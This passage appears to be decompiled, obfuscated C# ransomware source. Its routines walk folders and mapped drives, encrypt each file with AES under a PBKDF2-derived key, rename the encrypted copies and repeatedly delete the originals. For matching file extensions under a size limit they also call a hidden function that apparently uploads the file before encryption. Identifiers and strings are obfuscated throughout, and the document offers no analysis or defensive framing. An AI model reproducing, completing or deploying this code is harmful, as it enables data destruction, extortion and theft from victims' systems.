									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!MFCrMNyVwftIF)
						{
							if (!XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (eSjMTjCatON)
						{
							CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
						}
						byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
						{
							if (!wRVzxmISkhBzKR)
							{
								if (!MFCrMNyVwftIF)
								{
									nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY);
								}
								else
								{
									nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
								}
							}
							else
							{
								try
								{
									if (!MFCrMNyVwftIF)
									{
										jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
									}
									else
									{
										jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
									}
								}
								catch (Exception ex2)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386050) + ex2.Message + HbGtZiKmUw.getString_0(107395833));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!wRVzxmISkhBzKR)
						{
							if (!MFCrMNyVwftIF)
							{
								nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386059), cjnjoiIOwY);
							}
							else
							{
								nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386059), Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
							}
						}
						else
						{
							try
							{
								if (!MFCrMNyVwftIF)
								{
									jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
								}
								else
								{
									jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386050) + ex2.Message + HbGtZiKmUw.getString_0(107395833));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								return;
							}
						}
						if (MFCrMNyVwftIF)
						{
							if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
							{
								kwCznOOXZRpq(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, bytes);
							}
							else
							{
								kwCznOOXZRpq(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, bytes);
							}
						}
					}
					end_IL_032d:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ae4;
			IL_0ae4:
			CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
		});
	}

	private static void agRLrzzLVFGQ(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CMdYdSoRLCrMajhb == getString_0(107396866))
					{
						foreach (string item in hHDzREQRrQkqjKe)
						{
							if (string_0.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396866))
							{
								if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396304))
							{
								try
								{
									YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386040)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386040), getString_0(107389090)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void jDHUSaghZQjW(string WMTEDlFunmIh, string dCpGFrwPTys, byte[] zKejgstJby, byte[] rvHraRATMFcVGeNk = null)
	{
		try
		{
			if (CMdYdSoRLCrMajhb == getString_0(107396866))
			{
				FileStream fileStream = new FileStream(WMTEDlFunmIh, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (WMTEDlFunmIh.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396866))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), WMTEDlFunmIh);
							}
							catch
							{
							}
						}
					}
					else if (WMTEDlFunmIh.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396304))
					{
						try
						{
							YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), WMTEDlFunmIh);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (WMTEDlFunmIh != dCpGFrwPTys)
		{
			File.Move(WMTEDlFunmIh, dCpGFrwPTys);
			WMTEDlFunmIh = dCpGFrwPTys;
		}
		byte[] bytes = yJUJkIUuqJMKqH.NzBtYERGLLff(File.ReadAllBytes(WMTEDlFunmIh), zKejgstJby, rvHraRATMFcVGeNk);
		File.WriteAllBytes(WMTEDlFunmIh, bytes);
		DnHtYVwZFeaR++;
	}

	private static void nQqNAlsrsLR(string string_0, string string_1, byte[] byte_0)
	{
		YzHiiJFmHgXJX CS_0024_003C_003E8__locals0 = new YzHiiJFmHgXJX();
		CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc = string_0;
		CS_0024_003C_003E8__locals0.VBXkXxUgmNJw = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string vBXkXxUgmNJw = CS_0024_003C_003E8__locals0.VBXkXxUgmNJw;
			FileStream fileStream = new FileStream(vBXkXxUgmNJw, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (kcgyNtrPsiyuwV == getString_0(107396866))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.Length > 0)
				{
					if (CMdYdSoRLCrMajhb == getString_0(107396866))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in hHDzREQRrQkqjKe)
						{
							if (CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396866))
							{
								if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396304))
							{
								try
								{
									YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.EndsWith(getString_0(107386040)))
					{
						File.Move(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw, CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.Replace(getString_0(107386040), getString_0(107389090)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw))
							{
								File.Delete(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386799) + CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc + getString_0(107386031) + ex2.Message + getString_0(107395814));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> chiDTlAoGQMI = ChiDTlAoGQMI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386433)), string_0);
			};
		}
		Parallel.ForEach(chiDTlAoGQMI, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		List<string> source = qCvAdJfngnF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		if (pdVkOWqmIAKIO == getString_0(107396866))
		{
			string[] source2 = yWgWMeznrQnK;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), getString_0(107386427) + string_0 + getString_0(107386418));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		if (!pIFGXSXFivCGoDR().Contains(getString_0(107388604)))
		{
			try
			{
				tYjyeLOdohO(ApqYNCacJvgq);
			}
			catch (Exception)
			{
			}
			List<string> source3 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
				{
					hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		}
		else
		{
			List<string> source4 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
				{
					hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
		}
		List<string> source5 = hYLuEtEuxHyq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386381)), string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
	}

	private static void _003CMain_003Eb__e(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386433)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), getString_0(107386427) + string_0 + getString_0(107386418));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386381)), string_0);
	}

	private static void _003CMapDrv_003Eb__1e(string string_0)
	{
		azsGgSfLyvmkzG CS_0024_003C_003E8__locals0 = new azsGgSfLyvmkzG();
		CS_0024_003C_003E8__locals0.bkYXYKOePlV = string_0;
		if ((!CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386396)) && !CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386391)) && !CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386350)) && !CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386350))) || !zBiFvXBiIzopyL.sMIgMoBgKW(CS_0024_003C_003E8__locals0.bkYXYKOePlV))
		{
			return;
		}
		try
		{
			Thread.Sleep(bcPffxszCs);
			qyAhWYLrtiOtS.Add(getString_0(107387704) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + getString_0(107386337));
			try
			{
				if (qqVKUcwYqRObMU)
				{
					Console.WriteLine(getString_0(107387704) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + getString_0(107386337));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(bcPffxszCs);
				qyAhWYLrtiOtS.Add(azsGgSfLyvmkzG.getString_0(107387710) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + azsGgSfLyvmkzG.getString_0(107396794) + (char)int_0 + azsGgSfLyvmkzG.getString_0(107412105));
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(azsGgSfLyvmkzG.getString_0(107387710) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + azsGgSfLyvmkzG.getString_0(107396794) + (char)int_0 + azsGgSfLyvmkzG.getString_0(107412105));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static fQUgTOUpJumL()
	{
		Strings.CreateGetStringDelegate(typeof(fQUgTOUpJumL));
		AgnlixIASzPo = getString_0(107388599);
		cjnjoiIOwY = null;
		oLUeHhoXSrXL = getString_0(107396304);
		rqLFEsCDTMyF = getString_0(107386360);
		qyAhWYLrtiOtS = new List<string>();
		ZptgORKOFpXG = new List<string>();
		UyxzMyCitXGF = getString_0(107396304);
		kEFVKbULbQeU = getString_0(107389090);
		HZePHYGbpexu = getString_0(107389090);
		jdzEbvPutazU = getString_0(107389090);
		ZRDcpXUTjf = getString_0(107396304);
		mChCVJySpU = 0;
		mdbUrlsnzSwt = getString_0(107396304);
		WLuIVsIaUhiu = getString_0(107396304);
		HCpNwQtDwzNYscU = getString_0(107396304);
		GGlQFQXWCSTMex = getString_0(107386315);
		JEhiYMEqiJZdM = getString_0(107396304);
		IgkMrPNdoY = getString_0(107396304);
		NCTXVCAZAjOmyja = getString_0(107396304);
		xZEDYYkzZNtnw = getString_0(107396304);
		LhumsKBCnHATf = new List<string>
		{
			khBNqVxVYaM(getString_0(107386310)),
			khBNqVxVYaM(getString_0(107386325)),
			khBNqVxVYaM(getString_0(107386300)),
			khBNqVxVYaM(getString_0(107386251)),
			khBNqVxVYaM(getString_0(107386258)),
			khBNqVxVYaM(getString_0(107385721)),
			khBNqVxVYaM(getString_0(107385672)),
			khBNqVxVYaM(getString_0(107385679)),
			khBNqVxVYaM(getString_0(107385654)),
			khBNqVxVYaM(getString_0(107385629)),
			khBNqVxVYaM(getString_0(107385580)),
			khBNqVxVYaM(getString_0(107385587)),
			khBNqVxVYaM(getString_0(107385562))
		};
		rEUVMKgscr = new List<string>();
		oMdDoqdvvo = getString_0(107396866);
		VIQnoauQMXDbY = getString_0(107396304);
		GMXxpLBEnImyJ = getString_0(107396304);
		lBBLtRfPsPV = new List<string>();
		MNBzqiuQfRJQcYj = getString_0(107396304);
		XgJEKIOOydLD = getString_0(107385505);
		mWfsjXfVaDjgsa = getString_0(107396304);
		ncZxFsAKDqAUKI = getString_0(107396304);
		ChiDTlAoGQMI = new List<string>
		{
			khBNqVxVYaM(getString_0(107385488)),
			khBNqVxVYaM(getString_0(107385919)),
			khBNqVxVYaM(getString_0(107385870)),
			khBNqVxVYaM(getString_0(107385853)),
			khBNqVxVYaM(getString_0(107385772)),
			khBNqVxVYaM(getString_0(107385195)),
			khBNqVxVYaM(getString_0(107385150)),
			khBNqVxVYaM(getString_0(107385057))
		};
		qCvAdJfngnF = new List<string>
		{
			khBNqVxVYaM(getString_0(107385000)),
			khBNqVxVYaM(getString_0(107384967)),
			khBNqVxVYaM(getString_0(107385466)),
			khBNqVxVYaM(getString_0(107385385)),
			khBNqVxVYaM(getString_0(107385352)),
			khBNqVxVYaM(getString_0(107385335)),
			khBNqVxVYaM(getString_0(107385258)),
			khBNqVxVYaM(getString_0(107385225)),
			khBNqVxVYaM(getString_0(107384680)),
			khBNqVxVYaM(getString_0(107384647)),
			khBNqVxVYaM(getString_0(107384614)),
			khBNqVxVYaM(getString_0(107384581)),
			khBNqVxVYaM(getString_0(107384572)),
			khBNqVxVYaM(getString_0(107384531)),
			khBNqVxVYaM(getString_0(107384454)),
			khBNqVxVYaM(getString_0(107384933)),
			khBNqVxVYaM(getString_0(107384924)),
			khBNqVxVYaM(getString_0(107384891)),
			khBNqVxVYaM(getString_0(107384850)),
			khBNqVxVYaM(getString_0(107384777)),
			khBNqVxVYaM(getString_0(107384744)),
			khBNqVxVYaM(getString_0(107384703)),
			khBNqVxVYaM(getString_0(107384190)),
			khBNqVxVYaM(getString_0(107385000)),
			khBNqVxVYaM(getString_0(107384149)),
			khBNqVxVYaM(getString_0(107384076)),
			khBNqVxVYaM(getString_0(107384031)),
			khBNqVxVYaM(getString_0(107384030)),
			khBNqVxVYaM(getString_0(107383989)),
			khBNqVxVYaM(getString_0(107384428)),
			khBNqVxVYaM(getString_0(107384395)),
			khBNqVxVYaM(getString_0(107384354)),
			khBNqVxVYaM(getString_0(107384345)),
			khBNqVxVYaM(getString_0(107384967)),
			khBNqVxVYaM(getString_0(107384304)),
			khBNqVxVYaM(getString_0(107385466)),
			khBNqVxVYaM(getString_0(107384271)),
			khBNqVxVYaM(getString_0(107384206)),
			khBNqVxVYaM(getString_0(107383653)),
			khBNqVxVYaM(getString_0(107383620)),
			khBNqVxVYaM(getString_0(107383611)),
			khBNqVxVYaM(getString_0(107383570)),
			khBNqVxVYaM(getString_0(107383537)),
			khBNqVxVYaM(getString_0(107383504)),
			khBNqVxVYaM(getString_0(107383431)),
			khBNqVxVYaM(getString_0(107383934)),
			khBNqVxVYaM(getString_0(107383893))
		};
		bruHyzeehnYYe = new List<string>
		{
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383820))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383803))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383710))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383101))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107382976))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383391))),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383298))),
			khBNqVxVYaM(getString_0(107383201)),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107382596))),
			khBNqVxVYaM(getString_0(107382499)),
			khBNqVxVYaM(getString_0(107382406)),
			khBNqVxVYaM(getString_0(107382821)),
			khBNqVxVYaM(getString_0(107382728)),
			khBNqVxVYaM(OwlNQHGyCZF(getString_0(107383820)))
		};
		ApqYNCacJvgq = khBNqVxVYaM(getString_0(107382119));
		hYLuEtEuxHyq = new List<string>
		{
			khBNqVxVYaM(getString_0(107382038)),
			khBNqVxVYaM(getString_0(107382356)),
			khBNqVxVYaM(getString_0(107382162)),
			khBNqVxVYaM(getString_0(107381456)),
			khBNqVxVYaM(getString_0(107381742)),
			khBNqVxVYaM(getString_0(107381036))
		};
		GYrkTbkHmlHWMo = new List<string>
		{
			khBNqVxVYaM(getString_0(107381354)),
			khBNqVxVYaM(getString_0(107381293)),
			khBNqVxVYaM(getString_0(107381264))
		};
		ZEmVnICIbBRUZQ = getString_0(107396304);
		UgaPTwgoRjIJ = getString_0(107396304);
		dcWTdhUfGduYB = new DateTime(2000, 1, 1);
		pIlCbMiwoka = new DateTime(2100, 1, 1);
		ZTtOBFIFhDPJ = getString_0(107396866);
		ybUSgcGwjKebC = getString_0(107386129);
		bfLHAxJfKaXqSS = getString_0(107396304);
		HOpZOfKRSkqrQ = getString_0(107396304);
		dzHgpDGlGW = getString_0(107396304);
		bMxANrWiPUcalcb = getString_0(107396866);
		NkvCSDGHDZ = getString_0(107396304);
		CMdYdSoRLCrMajhb = getString_0(107396304);
		hHDzREQRrQkqjKe = new List<string>
		{
			getString_0(107395980),
			getString_0(107395694),
			getString_0(107396014),
			getString_0(107395607)
		};
		TQwKQbvIHjGUX = getString_0(107396304);
		wlgCZFnHvCei = getString_0(107381203);
		SGWNbaKnmA = getString_0(107396304);
		LMpNgFGShlT = getString_0(107396304);
		TTbEbSgDAnnJ = getString_0(107396304);
		FalYYrscvz = string.Empty;
		vEIuBeySmAexSb = getString_0(107396304);
		wvVqxnBdrKxaCFZ = getString_0(107396866);
		kvwQzPxIqIlk = getString_0(107396866);
		VyRGExDcVMKv = getString_0(107381166);
		DsHDKKZPqyRV = getString_0(107413349);
		cldkFsbciuo = getString_0(107396304);
		jJkNZEReBTMkuY = getString_0(107396866);
		HVmQpJlElf = getString_0(107396866);
		oTOnJctkwlomjyOZ = getString_0(107396304);
		eRcopzfggFE = getString_0(107396304);
		TUGYFpvgdQx = getString_0(107388708);
		eKzyHsWGljk = getString_0(107396304);
		KMWeqbAyUYuGHH = getString_0(107396866);
		rwyuADDQdblNA = getString_0(107412643);
		OCCDMTBKtUqAz = getString_0(107396304);
		rWgzoQLgIQfGZ = getString_0(107396304);
		YWANRiRWiwxS = getString_0(107396304);
		ZOYchrvgjtkVKhh = getString_0(107396304);
		PvAuHyHwFZ = getString_0(107412658);
		IRCSlCXoMRFG = getString_0(107396866);
		iHEcKVZxNihtAo = getString_0(107396866);
		fFgPwmFliHHKe = getString_0(107396304);
		pdVkOWqmIAKIO = getString_0(107396304);
		yWgWMeznrQnK = new string[0];
		kcgyNtrPsiyuwV = getString_0(107396866);
		OIyyeuNoRzhHTwe = true;
		DMbGhzJPCMTj = getString_0(107396304);
		MFCrMNyVwftIF = true;
		ryIZnDiEOid = false;
		EekjbAOphgGS = false;
		EMUmjShvoRjVxRTfB = false;
